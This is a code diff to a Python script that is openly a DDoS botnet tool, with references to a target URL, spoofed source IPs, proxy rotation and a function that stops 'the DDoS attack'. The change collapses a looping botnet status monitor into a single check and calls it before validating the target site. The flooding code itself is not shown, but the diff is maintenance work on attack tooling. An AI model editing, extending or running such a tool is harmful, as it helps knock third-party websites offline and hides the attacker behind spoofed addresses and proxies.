@@ -275,27 +275,12 @@ def stop_attack():
     print("Stopping the DDoS attack...")
     sys.exit()
 
-
 def check_botnet_status():
     print("Checking botnet status...")
-    while True:
-        try:
-            print(f"Botnet size: {botnet_size}")
-            print(f"Target IP: {random.choice(get_ip_addresses(target_url))}")
-            print(f"Spoofed IP: {spoofer()}")
-            proxy = random.choice(proxy_list)
-            proxy_ip, proxy_port = proxy.split(":")
-            print(f"Proxy: {proxy_ip}:{proxy_port}")
-
-            # Check if the botnet is active or not
-            if botnet_size > 0:
-                print("Botnet is online and ready to launch attacks!")
-            else:
-                print("Botnet is offline. Unable to launch attacks.")
-
-            time.sleep(5)  # Wait for 5 seconds before printing the status again
-        except:
-            pass
+    if botnet_size > 0:
+        print("Botnet is active and ready to launch attacks!")
+    else:
+        print("Botnet is offline. Unable to launch attacks.")
 
 def check_website(url):
     if not url.startswith("http://") and not url.startswith("https://"):
@@ -321,6 +306,9 @@ def check_website(url):
     except:
         print("Sorry, the website URL is not valid.")
 
+check_botnet_status()
 check_website(target_url)
+
+
 
 
